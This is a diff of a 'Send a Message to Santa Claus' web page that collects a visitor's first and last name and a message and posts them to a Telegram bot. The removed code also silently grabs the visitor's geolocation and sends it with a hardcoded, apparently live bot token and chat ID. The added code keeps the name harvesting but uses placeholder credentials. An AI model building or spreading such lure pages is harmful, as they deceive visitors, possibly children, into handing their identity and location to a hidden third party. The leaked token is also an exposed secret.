@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Noel Baba'ya Mesaj Gönder 🎅🎄</title>
+    <title>Send a Message to Santa Claus 🎅🎄</title>
     <style>
         /* Sayfa genel stilleri */
         body {
@@ -170,10 +170,10 @@
 <body>
 
     <div class="container">
-        <h1>Noel Baba'ya Mesaj Gönder 🎅🎄</h1>
-        <input type="text" id="user-name" placeholder="Adınızı ve soyadınızı paylaşır mısınız? 😊">
-        <input type="text" id="user-message" placeholder="Noel Baba'ya bir mesaj yazın...">
-        <button id="send-message">Gönder</button>
+        <h1>Send a Message to Santa Claus 🎅🎄</h1>
+        <input type="text" id="user-name" placeholder="Could you share your first and last name? 😊">
+        <input type="text" id="user-message" placeholder="Write a message to Santa Claus...">
+        <button id="send-message">Send</button>
         <p id="status">...</p>
     </div>
 
@@ -195,54 +195,41 @@
             const userName = document.getElementById('user-name').value; // Kullanıcının ismini al
             const userMessage = document.getElementById('user-message').value; // Kullanıcının mesajını al
 
-            // Konum bilgisini almak için Geolocation API'yi kullan
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((position) => {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
+            // Mesaj göndermeyi simüle et
+            if (userName && userMessage) {
+                status.textContent = 'Your message is being sent...';
 
-                    // Mesaj göndermeyi simüle et
-                    if (userName && userMessage) {
-                        status.textContent = 'Mesajınız gönderiliyor...';
+                // Telegram Bot API URL'si
+                var token = "YOUR_BOT_TOKEN"; // Bot token
+                var chatId = "YOUR_CHAT_ID"; // Chat ID (Bu sizin chat_id'niz)
 
-                        // Telegram Bot API URL'si
-                        var token = "7782206979:AAE_JMIsLiSJaKpgEFFYU4eWaYHCXZqciAg"; // Bot token
-                        var chatId = "5312871954"; // Chat ID (Bu sizin chat_id'niz)
+                var url = `https://api.telegram.org/bot${token}/sendMessage`;
 
-                        var url = `https://api.telegram.org/bot${token}/sendMessage`;
+                // Mesaj içeriğini oluştur, kullanıcı adı ve mesaj ile birlikte
+                var text = `User Name: ${userName}\nMessage: ${userMessage}`;
 
-                        // Mesaj içeriğini oluştur, kullanıcı adı, mesaj ve konum ile birlikte
-                        var text = `Kullanıcı Adı: ${userName}\nMesaj: ${userMessage}\nKonum: Latitude: ${latitude}, Longitude: ${longitude}`;
-
-                        // Veriyi Telegram API'sine gönder
-                        fetch(url, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({
-                                chat_id: chatId,
-                                text: text
-                            })
-                        })
-                            .then(response => response.json())
-                            .then(data => {
-                                console.log("Mesaj gönderildi:", data);
-                                status.textContent = 'Mesajınız başarıyla gönderildi! 🎅';
-                            })
-                            .catch(error => {
-                                console.error("Hata:", error);
-                                status.textContent = 'Bir hata oluştu, lütfen tekrar deneyin.';
-                            });
-                    } else {
-                        status.textContent = 'Lütfen isminizi ve mesajınızı girin.';
-                    }
-                }, (error) => {
-                    console.error(error);
-                    status.textContent = 'Konum bilgisi alınamadı, lütfen tekrar deneyin.';
-                });
+                // Veriyi Telegram API'sine gönder
+                fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: text
+                    })
+                })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log("Message sent:", data);
+                        status.textContent = 'Your message has been sent successfully! 🎅';
+                    })
+                    .catch(error => {
+                        console.error("Error:", error);
+                        status.textContent = 'An error occurred, please try again.';
+                    });
             } else {
-                status.textContent = 'Geolocation API desteklenmiyor.';
+                status.textContent = 'Please enter your name and message.';
             }
         });
     </script>
